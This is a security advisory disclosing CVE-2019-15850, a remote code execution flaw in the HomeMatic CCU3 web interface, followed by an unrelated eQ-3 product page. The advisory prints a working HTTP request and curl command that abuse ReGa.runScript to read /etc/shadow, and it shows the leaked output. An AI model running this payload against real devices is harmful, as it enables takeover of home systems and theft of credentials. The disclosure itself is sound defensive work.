=== Content from noskill1337.github.io_245400e5_20250121_000947.html ===

[# joshua@cyfire:~$](/)
[## Blog](/blog)
[## About](/about)
[## Contact](/contact)
[## Cyfire](https://cyfire.net/cyber-security/)

![](/assets/pixabay/matrix-1799659_1920.jpg)

# CVE-2019-15850: Remote Code Execution in HomeMatic central CCU3

01 Oct 2019, Joshua Lehr

## Overview

* Vulnerability: Remote Code Execution (RCE)
* Vendor: eQ-3 AG
* Vendor Homepage: <https://www.eq-3.com/contact.html>
* Product: HomeMatic central CCU3
* Version: 3.41.11

## Background

HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU3 is a central control unit, which is responsible for integrating these components with each other.

From the vendor’s [website](https://www.homematic-ip.com/produkte/detail/smart-home-zentrale-ccu3.html):
“The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). …”

## Issue Description

While analyzing the implementation of the home automation system HomeMatic, one Remote Code Execution (RCE) vulnerability has been identified, which can be exploited in order to exploit the underlaying system. The vulnerability exists in the method ‘ReGa.runScript’ of the WebUI. The affected version is **3.41.11**.

![Affected Version](/assets/CVE-2019-15850/CVE-2019-15850.HomeMatic.Version.JPG)

This vulnerability can be exploited by authenticated attackers with access to the web interface to execute system commands.

The following **HTTP request** illustrates this approach:

```
POST /api/homematic.cgi HTTP/1.1
Host: 192.168.0.125
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.125/pages/index.htm?sid=@KqlhlInB8S@&client=3
Content-Type: application/json
Content-Length: 199
Connection: close

{"version": "1.1", "method": "ReGa.runScript", "params": {"script": "string stdout;string stderr;system.Exec(\"cat /etc/shadow\", &stdout, &stderr);WriteLine(stdout);", "_session_id_": "KqlhlInB8S"}}

```

The **HTTP Response** is:

```
HTTP/1.1 200 OK
CONTENT-TYPE: application/json; charset=utf-8
Content-Length: 411
Connection: close
Date: Sun, 01 Sep 2019 18:37:40 GMT
Server: lighttpd/1.4.50

{"version": "1.1","result": "root::10933:0:99999:7:::\ndaemon:*:10933:0:99999:7:::\nbin:*:10933:0:99999:7:::\nsys:*:10933:0:99999:7:::\nsync:*:10933:0:99999:7:::\nmail:*:10933:0:99999:7:::\nwww-data:*:10933:0:99999:7:::\nhalt:*:10933:0:99999:7:::\nuucp:*:10933:0:99999:7:::\noperator:*:10933:0:99999:7:::\nftp:*:10933:0:99999:7:::\nnobody:*:10933:0:99999:7:::\n_ntp:*:::::::\nsshd:*:::::::\n\r\n","error": null}

```

![POC](/assets/CVE-2019-15850/CVE-2019-15850.HomeMatic.RCE.JPG)

You can easily fire this **curl command** to illustrates this approach:

```
curl -i -s -k  -X $'POST' \
    -H $'Host: 192.168.0.125' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.0.125/pages/index.htm?sid=@KqlhlInB8S@&client=3' -H $'Content-Type: application/json' -H $'Content-Length: 199' -H $'Connection: close' \
    --data-binary $'{\"version\": \"1.1\", \"method\": \"ReGa.runScript\", \"params\": {\"script\": \"string stdout;string stderr;system.Exec(\\\"cat /etc/shadow\\\", &stdout, &stderr);WriteLine(stdout);\", \"_session_id_\": \"KqlhlInB8S\"}}' \
    $'http://192.168.0.125/api/homematic.cgi'

```
## Impact

This vulnerability affects the confidentiality / integrity / availability of the system/data. This allows an attacker to read / manipulate the system. If an attacker is aware of the security issue, he or she may steal important data or compromise the system. With this vulnerability, a complete system compromise is possible.

## Remediation

In order to avoid this vulnerability, it’s suggested to disable the WebUI of HomeMatic. The HomeMatic-WebUI have many other security issues.

Vendor will not change the concept of this JSON API function.

## CVE

* CVE: [CVE-2019-15850](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15850)
* CVSS Base Score: **9.1**
* CVSS: 3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L

## Credit

* Joshua Lehr

## Vulnerability Disclosure Timeline

* 2019-September-01: Discovered vulnerability
* 2019-September-04: Vendor Notification
* 2019-September-10: Vendor Response (Vendor will not change the concept)
* 2019-October-01: Public Disclosure

## Disclaimer

The information provided is released “as is” without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

System administrators need tools like this to discover vulnerable hosts. This tool is offered for legal purposes only and to forward the security community’s understanding of this vulnerability. As this PoC actively exploits the vulnerability, do not use against targets without prior permission.

The contents of this advisory are copyright (c) 2019 Joshua Lehr and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.

## License

This work is licensed under a [![CC BY-NC-SA 4.0](https://i.creativecommons.org/l/by-nc-sa/4.0/80x15.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode)

[**Joshua Lehr**

© 2019](https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode)



=== Content from www.eq-3.com_8805ab73_20250121_000947.html ===


[![](assets/images/3/logo_eq3-3048d9a1.png)](start.html)

[![](assets/images/3/logo_eq3-7b66e58f.png)](start.html)

[Skip navigation](products/homematic.html#skipNavigation21)

* [Products](products.html "Products")
* [About eQ-3](about-eq-3.html "About eQ-3")
* [Partners](partners.html "Partners")
* [Service](service.html "Service")

* [Supplier](partners/supplier.html)
* [Installation partners](partners/installation-partners.html)
* [FAQ](service/faq.html)
* [Press](press.html)
* [Contact](contact.html)

* [de](https://www.eq-3.de/produkte/homematic.html)
* en

![](assets/images/d/produkte_homematic-14e7e7f8.png)

![](downloads/eq3/logo/HomeMatic_Schriftzug_blau_low.png)

The system for professionals and enthusiasts

* [Home](start.html "Home")
* [Products](products.html "Products")
* [Homematic](products/homematic.html "Homematic")

## eQ-3 looks to the future: full focus on the further development of Homematic IP

**Leer, 06.07.2023**

eQ-3, the European market leader for whole-home systems\*, is now focusing even more on the long-term further development of the Homematic IP smart home system and the expansion of its portfolio of more than 150 products. To make this possible, the production of the predecessor system, Homematic, will be discontinued after almost 20 years. However, there is no reason for Homematic users to worry. They can continue to use their smart home installation without restrictions and will continue to be supplied with security-relevant updates for at least another ten years. In addition, combined operation of Homematic and Homematic IP is possible via the smart home central control unit CCU3, which also allows for a simple, step-by-step changeover. In the beginning, there was an idea: "We make smart home simple". Following this guiding principle, in 2005 eQ-3 developed the first generation of a bidirectional home control system which, thanks to its flexibility and convenient operation, was suitable for almost every user: Homematic. Today, almost 20 years later, the company can look back on three generations of Homematic smart home control centres, a portfolio of more than 200 devices and numerous satisfied users.

In the meantime, however, Homematic has been almost completely replaced by its successor Homematic IP, which has been available since 2015. Homematic IP represents a consistent improvement and further development of Homematic in all areas, making home automation even more flexible, simple and convenient. eQ-3 has therefore decided to focus all available resources on the long-term expansion of Homematic IP and to discontinue the development and production of Homematic after a long and successful production period.

### What does this step mean for Homematic users?

All owners of a Homematic installation can continue to use their Smart Home devices in the future as usual and without restrictions. Security-relevant updates will continue to be provided for at least ten years.

In addition, the CCU3 smart home central unit enables combined operation of Homematic and Homematic IP. This means that a Homematic installation can be easily expanded with Homematic IP components in the future. It also enables a gradual changeover to the current Homematic IP smart home system.

### Can I continue to buy Homematic components?

eQ-3 no longer manufactures new Homematic devices. However, a whole range of Homematic components will still be available in the coming years through sales partners such as ELV.

### How can I switch from Homematic to Homematic IP?

The switch from Homematic to the successor system Homematic IP is particularly easy with the Smart Home central control unit CCU3, which enables the combined operation of components from both systems. The Homematic IP portfolio comprises more than 150 products and includes a suitable solution for almost every Homematic application. This means that nothing stands in the way of a step-by-step changeover.

[![Control units and gateways](assets/images/0/hm-zentrale-ccu2-l-os_103584-69e692a3.png)](products/homematic/control-units-and-gateways.html "Control units and gateways")

## [Control units and gateways](products/homematic/control-units-and-gateways.html "Control units and gateways")

Homematic devices can be connected to one another and programmed via the control units and gateways. The Homematic Central Control Unit CCU2 is responsible for numerous control, signalling and supervision functions across all areas of the Homematic system. The device includes a browser based user interface...

[![Heating and climate control](assets/images/0/hm-funk-heizkoerperthermostat-r-os_105155-1002fbd8.png)](products/homematic/heating-and-climate-control.html "Heating and climate control")

## [Heating and climate control](products/homematic/heating-and-climate-control.html "Heating and climate control")

Homematic Radiator Thermostats offer demand-based room-by-room control of radiators in connection with Homematic Window Sensor and Wall Thermostats. Homematic products regulate the room temperature and air quality. The bathroom is warmed up to 24 °C in the morning without wasting energy at night. Shutters open and close when...

[![Lights](assets/images/2/hm-funk-schaltaktor-1-fach-f-ms-schraeg-os_103029-88e0c571.png)](products/homematic/lights.html "Lights")

## [Lights](products/homematic/lights.html "Lights")

Over the last ten years, the number of light sources in houses has considerably increased. This implies a growing desire for comfort and the need for triggering recurring lighting scenarios in the house, e.g. for joint dinners or comfortable movie nights at home. Different applications of the Homematic areas light, awning and shutter control...

[![Shutters and awnings](assets/images/6/hm-funk-rollladenaktor-1-fach-up-r-os_76799-413e2dac.png)](products/homematic/shutters-and-awnings.html "Shutters and awnings")

## [Shutters and awnings](products/homematic/shutters-and-awnings.html "Shutters and awnings")

Using a combination of different actuators for indoor and outdoor areas, you can easily realise individual programs and scenarios for your personal shutter and awning control. Besides a basic shutter control, extended functionalities can be integrated into your smart home with Homematic. By slowly waking up in the morning as the shutters will be raised step by step...

[![Security and surveillance](assets/images/4/hm-funk-bewegungsmelder-aussen-schraeg-os_131777-a8750b48.png)](products/homematic/security-and-surveillance.html "Security and surveillance")

## [Security and surveillance](products/homematic/security-and-surveillance.html "Security and surveillance")

Homematic Window and Door Contacts detect any doors or windows which have been left open. Wireless motion and smoke detectors ensure that inside and outside areas are continuously monitored. Homematic products increase the protection against break-ins and, however, the sense of security in your own four walls. There is no need to worry about...

[![Windows and doors](assets/images/6/hm-keymatic-weiss-r-os_151137a0-c41f4364.png)](products/homematic/windows-and-doors.html "Windows and doors")

## [Windows and doors](products/homematic/windows-and-doors.html "Windows and doors")

You will no longer have to carry around your bunch of keys during running! Simply connect any kind of fingerprint sensor with a push-button interface to the Homematic CCU2 and the KeyMatic will open your front door. Even windows that are difficult to access can now be used for ventilation. Simply install the WinMatic on...

[![Remote controls and push-buttons](assets/images/b/hm-funk-display-wandtaster-v-os_85975a0-c1213cb6.png)](products/homematic/remote-controls-and-push-buttons.html "Remote controls and push-buttons")

## [Remote controls and push-buttons](products/homematic/remote-controls-and-push-buttons.html "Remote controls and push-buttons")

Homematic remote controls and push-buttons offer flexible control of different Homematic devices according to your personal needs. Application fields are for example light, shutter and awning control. With the broad range of remote controls and push-buttons, there is an appropriate operating device for every application. Different use cases such as fast actuation in the event of an alarm, or multi-functional and flexible control of different...

[![Weather and environment](assets/images/e/hm-funk-kombisensor-oc-3-r-os_132192a0-228ec6cb.png)](products/homematic/weather-and-environment.html "Weather and environment")

## [Weather and environment](products/homematic/weather-and-environment.html "Weather and environment")

Homematic measures different weather data and is able to use that information for controlling various Homematic components. A storm is coming up and you have forgotten to retract your awnings? No worries: The Homematic Weather Data Sensor records the wind velocity and automatically triggers retracting of awnings depending on...

[![Switching and metering](assets/images/b/hm-funk-schaltaktor-1fach-zwischenstecker-typl-r_141129-de02c3cc.png)](products/homematic/switching-and-metering.html "Switching and metering")

## [Switching and metering](products/homematic/switching-and-metering.html "Switching and metering")

The number of energy consumers per household has considerably increased in recent years. Although the comfort could be increased in many ways with today’s technology, it is still important to detect the energy wasters in the house. This is possible e.g. with Homematic Plug Adapters with power metering. Comfortable on and off switching of...

[![DIN rail modules](assets/images/4/hmw-rs485-schaltaktor-2-fach-hs-r-os_76801-6e2fe989.png)](products/homematic/din-rail-modules.html "DIN rail modules")

## [DIN rail modules](products/homematic/din-rail-modules.html "DIN rail modules")

Using wired Homematic modules, the electrical installations for the entire building can be controlled intelligently. They communicate with one another via the Homematic bus and can be programmed and addressed accordingly. The central control unit can be used to easily reconfigure the system at any time. Since each component can be configured individually, virtually any scenario is possible, even post-installation without having...

[![International product variants](assets/images/5/hm-funk-schaltaktor-1fach-zwischenstecker-typf-v_132989-b6442450.png)](products/homematic/international-product-variants.html "International product variants")

## [International product variants](products/homematic/international-product-variants.html "International product variants")

With the international product variants of Homematic, the Homematic system can be operated in European countries that e.g. use other socket types. This enables easy operation of the system for example in Great Britain, Ireland and Italy. In addition, the product variants...

[![Adapters for brand switch systems](assets/images/f/hm-adapter-f-berker-schalterserienb1-v-web-40c27abc.png)](products/homematic/adapters-for-brand-switch-systems.html "Adapters for brand switch systems")

## [Adapters for brand switch systems](products/homematic/adapters-for-brand-switch-systems.html "Adapters for brand switch systems")

If you plan to make your home more and more comfortable using intelligent technology, existing electrical installations can be upgraded by installing Homematic flush-mount actuators for brand switch systems. And there is no need to completely exchange the existing switch series! The existing living concepts can thereby be maintained in terms of style...

[![](assets/images/1/faq-d87577ba.png)](service/faq.html)

[![](assets/images/6/mail-4e4035eb.png)](contact.html)

[![](assets/images/d/blog-3dfdf2e3.png)](press.html)

* Start
* [Legal Notice](contact/legal-notice.html)
* [Sitemap](service/articles/1080.html)

* [Privacy Policy](contact/privacy-policy.html)
* [Service](service.html)
* [Downloads](service/downloads.html)

* [Supplier](partners/supplier.html)
* [Press](press/press-overview.html)

![](assets/images/f/logo_eq3_weiss-74ac3333.png)

[![](assets/images/e/youtube_sidebar-e48265a8.png)](https://www.youtube.com/channel/UCZqO0Bjkmj3Phn_-TEs3cnQ/)

[![](assets/images/4/facebook_sidebar-a4a6a881.png)](https://www.facebook.com/homematicip/)

[![](assets/images/c/instagram-88ab465b.png)](https://www.instagram.com/homematicip_official/)

[![](assets/images/e/standort-a762bbc9.png)](partners/supplier.html "Supplier")

[![](assets/images/b/suche-9b46e092.png)](search.html "search")

\*According to Berg Insight's Smart Homes and Home Automation Study (2023) regarding "Whole Home" systems


